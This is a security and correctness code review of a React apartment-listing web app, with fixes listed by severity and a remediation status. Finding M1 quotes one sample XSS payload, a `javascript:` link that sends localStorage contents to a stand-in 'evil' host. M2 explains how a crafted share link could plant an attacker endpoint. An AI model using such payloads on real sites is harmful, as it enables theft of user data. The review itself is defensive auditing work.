# Code Review — apartment-shopping

Reviewer pass on the static React 18 + TS + Vite SPA. Build is clean (`tsc --noEmit` + `vite build`,
0 errors), `npm test` green (116/116), bundle 223 KB / 70 KB gz. The audit below is the failure-mode
layer those checks don't catch: correctness bugs, security, edge cases, dead code, simplification.

Each finding: `file:line` · what's wrong · why it matters · confidence · suggested fix.

---

## Verdict: **SHIP-WITH-MUST-FIXES**

One real security must-fix (unvalidated `href` scheme → `javascript:` XSS), one must-fix data-integrity
issue (a crafted share-hash silently persists into the user's permanent store), and one user-visible
correctness bug (user-added listings reorder on reload). Everything else is should/nice. The headline
distance feature, the sort-context "integration trap," the flag engine, and the offline geo path are all
correctly wired and match the frozen contract — good work on the highest-risk seams.

---

## PM REMEDIATION STATUS (2026-06-29) — applied by PM, re-verified (build clean, 173 tests pass, browser re-checked)
- **M1 FIXED** — added `safeHref()` (http(s)/mailto only) in `lib/format.ts`; applied at all 3 link sites (Card/DetailModal/CompareTable) + sanitized on form-save in ApartmentForm. Unit-tested (8 cases). Browser: `javascript:` URL rejected.
- **M2 FIXED** — removed the read-only URL-hash import path entirely from `useApartments.loadInitial` (no share-writer exists; per N1 this was the safer choice). Kills the silent-persist + planted-`sheetUrl` vector and resolves **S4** (dead `escape(atob)` decoder gone).
- **M3 FIXED** — `mergeWithSeed` now emits user-added listings first (preserving saved/newest-first order) then seed, so a just-added listing stays at the top after reload.
- **S2 FIXED** — CompareTable cost-row `numv` accessors return the raw nullable (dropped `?? 0`), so a listing with *unknown* parking/pet/deposit/fee is no longer highlighted as the cheapest "BEST".
- **S5 FIXED** — dropped the forbidden `User-Agent`/`Referer` fetch headers (browser strips them); keep `Accept`; comment corrected; test updated.
- **QA finding FIXED** — `resetFilters` now also clears the `furnishedOnly` / `leaseFitsTarget` quick-chips.
- **DEFERRED (accepted, low-risk, tracked in STATE.md):** S1 (lease-target can't be cleared to null), S3 (5-digit street number can mis-hit as ZIP — remote fallback mitigates), S6 (petFriendly cross-check only on form-create), N1 (no share-writer — intentionally not built), N2 (verified OK), N3/N4/N5/N6 (cosmetic/perf, negligible).

---

## MUST-FIX

### M1 — `sourceUrl` rendered into `href` with no scheme validation → `javascript:` / `data:` XSS
**`components/Card.tsx:178`, `components/DetailModal.tsx:224`, `components/CompareTable.tsx:123`**
Confidence: **high** · Severity: **high (security)**

`apt.sourceUrl` is free user text (typed in the Add/Edit form, or arrived via a share hash / pasted JSON)
and is injected directly as a link target:
```tsx
<a href={apt.sourceUrl} target="_blank" rel="noopener noreferrer">
```
React escapes *text* but does **not** sanitize URL *schemes*. A `sourceUrl` of
`javascript:fetch('https://evil/?c='+localStorage.apt.v1)` executes on click (modern React 18 warns
on `javascript:` hrefs but still renders the attribute; older/edge cases and `data:text/html` do not warn).
For a single-user local tool the self-XSS surface is small, but the import vectors (share hash, "paste JSON
from Claude") make this attacker-reachable, and it's the one place arbitrary user input lands in an
*executable* context. `rel="noopener"` does not help here.

**Fix:** centralize a `safeHref(url)` helper that returns the url only if it matches `^https?:` (optionally
`mailto:`), else `undefined`, and use it in all three call sites. e.g.
```ts
export function safeHref(u: string): string | undefined {
  return /^https?:\/\//i.test(u.trim()) ? u : undefined;
}
```
Apply the same guard at form-save time as defense in depth.

---

### M2 — A crafted `#hash` silently persists third-party data into the user's permanent store
**`state/useApartments.ts:156-174` (loadInitial) + `:199-205` (autosave effect)**
Confidence: **high** · Severity: **med→high (data integrity / security)**

`loadInitial()` reads `location.hash`, base64-decodes it, and — if it parses — makes it the initial app
state (`fromHash || localStorage`). The autosave effect then immediately writes that state to `apt.v1` on
mount. Net effect: **opening any `https://…/apartment-shopping/#<base64>` link overwrites/merges
attacker-controlled listings (and `settings`, including a `sheetUrl`!) into the victim's localStorage
permanently**, and the hash is never cleared from the address bar. A malicious `sheetUrl` planted this way
would cause a later "Sync to Sheet" to POST the user's whole dataset to an attacker's endpoint.

The parse is safely guarded against crashes (try/catch around `atob`/`JSON.parse`, `parsePersist` validates
shape) — so this is **not** a crash bug; it's a trust/persistence bug.

**Fix (pick at least the first two):**
1. After consuming a hash, **clear it** (`history.replaceState(null, '', location.pathname + location.search)`)
   so a refresh doesn't re-apply and the link doesn't linger.
2. Do **not** auto-persist hash-loaded state. Treat a share as a *preview*: load into memory, require an
   explicit "Save these to my board" action before it touches `apt.v1`. (Mirrors garage's intent — explicit
   share, explicit accept.)
3. Never let a shared hash carry `settings.sheetUrl` (strip it on import). The Sheet URL is a capability;
   it should only ever come from the user typing it in Settings.

---

### M3 — User-added listings jump to the end of the board after reload ("Added" sort breaks)
**`state/useApartments.ts:218-220` (addApartment) vs `:120-135` (mergeWithSeed)**
Confidence: **high** · Severity: **med (correctness, user-visible)**

`addApartment` prepends: `[apt, ...prev]`, so a freshly added listing shows at the **top** in-session.
But `mergeWithSeed` rebuilds order as **all seed ids first, then user-added ids** (the second loop appends
non-seed saved apts). So after a reload the just-added listing silently moves from the top to the **bottom**
of the default ("Added") view. The user adds a listing, sees it first, reloads, and it's gone from where
they expect it — looks like data loss until they scroll.

There's no stored timestamp to reconstruct true insertion order, so "Added" can't be made truly stable
without one.

**Fix (ranked):**
1. Persist and merge in a stable order. Simplest: in `mergeWithSeed`, interleave by the saved array's order
   when present rather than always seed-first — or prepend user-added (`out.unshift` / build the non-seed list
   first) so reload matches the in-session top-of-list behavior.
2. Add a `dateAdded`/`order` field to the persisted record and sort `added` by it (most robust; needs a
   types change → route through PM).
At minimum, make in-session and post-reload order agree.

---

## SHOULD-FIX

### S1 — `targetMinLease` / `targetMaxLease` can't be cleared and silently snap back to 6/12
**`components/SettingsModal.tsx:55-56`**
Confidence: **high** · Severity: **low→med (correctness)**

```ts
targetMinLease: Number(minLease) || 6,
targetMaxLease: Number(maxLease) || 12,
```
`Number('') === 0` and `Number('abc') === NaN`, both falsy → the `|| 6/12` fallback fires. So a user who
clears the field (intending "no bound", which the contract models as `null`/open) instead gets 6/12 forced
back. There is no way to express an open-ended target window from the UI even though the type and
`leaseFits` both support `null`. Also a deliberate `0` is impossible. Minor, but it's a silent override of
user intent.

**Fix:** map blank → `null` (`minLease.trim() === '' ? null : Number(...)`), and validate `NaN`/negative
separately rather than collapsing both to the default.

### S2 — `marketRent === 0` is treated as "unknown" by the over/under-market flags
**`lib/flags.ts:57, 107`** (and the `?? 0` cost rows in `CompareTable.tsx:84-90`)
Confidence: **med** · Severity: **low (correctness / contract nuance)**

The over/under-market rules guard with `apt.marketRent != null`, which is correct per contract. But in the
**card** (`Card.tsx:101`) the "vs … mkt" sub-price uses `apt.marketRent ? …` — a legitimate `marketRent: 0`
(unlikely but possible) would hide the chip. More relevant: in `CompareTable`, several "lowest cost"
highlight rows use `(a) => a.parkingCost ?? 0` etc., which means a listing with **unknown** parking/pet/
deposit/fee (`null`) is highlighted as the "best" ($0) — i.e. *unknown is rendered as the cheapest/winner*.
That directly contradicts the contract's core null rule ("Unknown data must never silently become a real
value… a missing rent is not $0 for ranking"). The cell text correctly shows "—", but the **BEST highlight**
will land on a listing that simply has no data.

**Fix:** in those `numv` accessors return the raw nullable (`(a) => a.parkingCost`) so `bestWorst` filters
nulls out (it already does: `.filter(v != null)`), instead of coercing `null → 0`.

### S3 — 5-digit street numbers can be mis-resolved as ZIPs
**`data/geocode.ts:36-39, 90-95`**
Confidence: **med** · Severity: **low (edge case)**

`extractZip` greps the first `\b\d{5}\b` in the raw query and tries it as a ZIP **before** city matching.
An address like `"12345 Foothill Blvd, Oakland"` extracts `12345`; if that 5-digit run happens to be a real
Bay Area ZIP key, it resolves to that ZIP's centroid instead of geocoding the actual address (and never
reaches the remote fallback). House numbers are commonly 5 digits, so this is a real, if uncommon, mis-hit.
Also `extractZip` takes the **first** match; `"500 Hayes St 94102"` works only because 500 is 3 digits.

**Fix:** prefer matching a ZIP that appears in a ZIP-like *position* (end of string, after a comma, or as the
sole token), or only treat a 5-digit run as a ZIP when the rest of the query is empty/state-only; otherwise
let it fall through to city/remote. Low priority since the remote fallback would eventually catch real
addresses — but here the false ZIP hit *prevents* the fallback.

### S4 — `decodeURIComponent(escape(atob(h)))` uses the deprecated `escape`
**`state/useApartments.ts:162`**
Confidence: **med** · Severity: **low (robustness / future-proofing)**

`escape`/`unescape` are deprecated and the `decodeURIComponent(escape(atob()))` idiom is the legacy UTF-8
trick. It works today and is try/catch-wrapped, but (a) it's brittle for non-Latin1 content and (b) there's
no corresponding **encoder** in the codebase (see N1), so this decoder can't even round-trip data the app
itself produced. If/when the share-write path is built, use `TextEncoder`/`TextDecoder` +
`btoa(String.fromCharCode(...new Uint8Array(...)))` (or a small base64url helper) on both ends.

### S5 — `geocodeRemote` sets `User-Agent`/`Referer` headers the browser will strip
**`data/geocode.ts:122-129`**
Confidence: **high** · Severity: **low (no-op, slightly misleading)**

`User-Agent` and `Referer` are [forbidden header names](https://developer.mozilla.org/docs/Glossary/Forbidden_header_name)
— `fetch` silently drops them in the browser. So the "sets a descriptive User-Agent per Nominatim policy"
guarantee is not actually met from a browser context (the browser sends its own UA + the page's real
Referer). This isn't harmful (the real Referer already identifies the GH Pages origin), but the comment
overstates compliance and the headers are dead. Note: per the file's own probe comment, Nominatim is
blocked/CORS'd anyway and the offline table is the real path, so impact is negligible.

**Fix:** drop the forbidden headers (keep `Accept`), and adjust the comment to "browser sends Referer
automatically; UA cannot be overridden from fetch."

### S6 — `petFriendly` cross-check only applies on *create from form*, not on imported/seed data
**`components/ApartmentForm.tsx:168-170`**
Confidence: **med** · Severity: **low (consistency)**

The contract §8 cross-check ("a 'No pets' policy should set `petFriendly:false`") is implemented only in
`draftToApt`, and only when the amenity is still `'?'`. Listings that arrive via the seed, share hash, or
pasted JSON with `petPolicy:'No pets'` + `amen.petFriendly` unset will show the pet pill as `?` rather than
`No`. Minor inconsistency; the contract does say `amen.petFriendly` is the pill's source of truth, so this
is arguably acceptable — flagging for coverage.

---

## NICE-TO-HAVE

### N1 — "URL-hash share" is read-only: there is no share-link *writer* anywhere
**(absence) — `state/useApartments.ts:156` reads the hash; nothing writes it**
Confidence: **high** · Severity: **low (incomplete feature / dead-ish code)**

The PRD lists "URL-hash share" as a carried-over feature, and `loadInitial` fully implements the *read*
side, but no component generates a share URL (`grep btoa|share` → no writer). So the decoder, the
`escape(atob())` path (S4), and the "Hash wins over localStorage" comment all serve a feature the user can't
trigger. Either build the writer (a "Copy share link" button that `btoa`-encodes `{apartments,settings*,
removed}` — minus `sheetUrl` per M2) or remove the reader to cut the M2 attack surface and the dead code.
Given M2, removing it is the safer default until the feature is intentionally finished.

### N2 — Anchor input has no debounce, but is safe because it never fires remote per-keystroke
**`components/Filters.tsx:117-134`** — Confidence: **high** · Severity: **none (verified OK)**

Worth recording since the prompt called it out: `geocodeRemote` (the only network call) fires **only** on
Enter / blur / "Set" click, never in `onChange`. `onChange` just updates local state. The `reqId` guard
(`:85, :97`) correctly drops stale async resolves. So the Nominatim ~1 req/sec policy is respected — no
per-keystroke firing. No change needed; the only theoretical abuse is holding Enter, which is self-inflicted
and offline-table-first anyway.

### N3 — `applySort` uses `Array.prototype.sort` for `nearest`/numeric keys — relies on engine stability
**`components/helpers.tsx:80-91`** — Confidence: **med** · Severity: **low**

`sort` is stable in all modern engines (ES2019+), so equal-distance / equal-rent ties keep input order as
the contract intends ("all Infinity → stable, no reorder"). This is fine for the target browsers; just
noting the implicit dependency. The `nearest` comparator's `(… ?? Infinity) - (… ?? Infinity)` yields
`Infinity - Infinity = NaN` when both are null — `sort` treats `NaN` as 0 (no swap), which preserves order,
so the degrade path is correct by luck-of-spec rather than by explicit null-first handling. Optional: guard
explicitly for readability.

### N4 — `pricePerSqft` and `amenCount` are recomputed multiple times per compare cell
**`components/CompareTable.tsx:77, 103, 106`** — Confidence: **high** · Severity: **low (perf, negligible)**

`pricePerSqft(a)` is called twice in the Rent/sqft row (render + `numv`), and `amenCount(a)` is called in
both the cell and `numv`, for every apartment, on every render of the compare table. With ≤ a handful of
compared listings this is irrelevant; mentioning only for completeness. No fix needed.

### N5 — `addAnchor` id uses `Date.now()+random`, collision-safe enough but not crypto
**`state/useApartments.ts:298`** — Confidence: **high** · Severity: **none**
Fine for a single-user local app; noting that ids are predictable (irrelevant here, no server trust).

### N6 — Minor: `Card.tsx:101` and `DetailModal` market-rent display use truthy check
**`components/Card.tsx:101`** — Confidence: **med** · Severity: **trivial**
`apt.marketRent ? … : null` hides a `marketRent: 0`. Same family as S2; harmless given $0 market rent is
not a real value. Use `!= null` for consistency if touched.

---

## Areas audited and found CLEAN (no action)

- **Sort-context "integration trap" (the #1 risk):** `App.tsx:43-51` correctly threads
  `{primaryAnchor, unit, settings}` into `applySort`, and `flagCtx` (`:38-41`) into `getFlags` for cards,
  detail, and compare. `useApartments` resolves `primaryAnchor` once via `useMemo` (`:339-344`) — no
  per-render re-resolution. Nearest sort and the far-anchor flag are genuinely wired, not no-ops.
- **Haversine** (`lib/distance.ts`): correct formula, `asin(min(1, …))` FP clamp, right Earth radii,
  null-degrades exactly per contract. `distanceToAnchor` returns null on null apt-coord OR null anchor.
- **`normalizeQuery`** handles trim/case/whitespace, trailing country then state token, punctuation collapse;
  ZIP-embedded-in-address and "City, CA" both resolve (tests confirm). `resolveAnchor` precedence
  ZIP→city→cache matches §3 and never throws / never networks.
- **Geocache** (`apt.geocache`): read/write fully try/catch-wrapped, corrupt-JSON → `{}`, non-array hit →
  null, quota/private-mode non-fatal. Correctly separate namespace from `apt.v1` and `apt.theme`.
- **`geocodeRemote`** returns null on every failure path (network/HTTP/empty/parse/non-finite), writes cache
  only on success, never throws (modulo the dead headers in S5).
- **`leaseFits`** matches the §5 open-bound overlap spec exactly; the `leaseFitsTarget` filter correctly
  drops both `false` AND `null` (`!== true`).
- **Flag engine** (`lib/flags.ts`): push order risk→warn→info→good is correct; `today` injectable; available-
  date uses strict `<` date-only compare; far-anchor fires only when anchor set AND apt has coords; lease-risk
  only on definite `false`; `signalLevel` collapses correctly. Imports are one-directional (no cycle).
- **`hydrateApartment` over `DEFAULT_APARTMENT`**: older saves missing new fields can't crash render;
  `amen`/`amenities` defensively cloned and type-checked. `parsePersist` rejects non-array `apartments`.
- **`mergeWithSeed`**: overlay persists only `rating`+`status`; user-added kept; `removed` set respected and
  not resurrected by the seed. (Only the *order* is wrong — M3.)
- **XSS / escaping (beyond M1):** no `dangerouslySetInnerHTML`, no `innerHTML`, no `eval`/`new Function`
  anywhere. Title/address/neighborhood/notes/amenities all render as React text (auto-escaped). The pasted
  `data:` image URI is rendered only in `<img src>` (assetUrl passes data:/blob:/http through) — images
  can't execute script, so that's safe. `target="_blank"` links carry `rel="noopener noreferrer"`.
- **Sheets-sync POST** (`ExportModal.tsx:42-58`): sends only `{rows: sheetMatrix(...)}` (data), no secrets;
  `sheetUrl` lives only in `settings`/localStorage, never bundled (grep confirms no committed Sheet URL).
  `no-cors` + opaque-response pattern is the correct garage-ported approach. (The only related risk is M2:
  don't let a share hash plant `sheetUrl`.)
- **No garage remnants / dead code:** every "car"/"garage" hit is a legitimate CSS class, comment, or the
  "Detached garage" amenity string. No leftover TCO/`cost.ts`/`effectiveMonthly` — scope cut honored
  (no `cost-asc` sort, rent-only ranking, raw cost fields tracked/exported only). Contract §4 respected.
- **Export columns** (`sheetCols.ts`): match §9 order; all 10 amenities via `amenState` (implications hold);
  `pricePerSqft` derived column present; nulls render blank, not 0.

---

### Hand-back summary

Counts — **MUST-FIX: 3**, **SHOULD-FIX: 6**, **NICE-TO-HAVE: 6** (3 of the nice-to-haves are
"verified OK / informational"). Must-fixes: **M1** unvalidated `href` scheme (`javascript:` XSS) → frontend
engineer, add a `safeHref` guard at all 3 link sites; **M2** crafted share-hash silently persists into
`apt.v1` (incl. a planted `sheetUrl`) → frontend engineer, clear the hash + don't auto-persist + strip
`sheetUrl` on import (or remove the read-only hash path per N1); **M3** user-added listings reorder to the
bottom on reload → frontend engineer, fix `mergeWithSeed` ordering. Verdict: **SHIP-WITH-MUST-FIXES** — the
core engine and the high-risk integration seams are correct; the must-fixes are contained, localized changes.
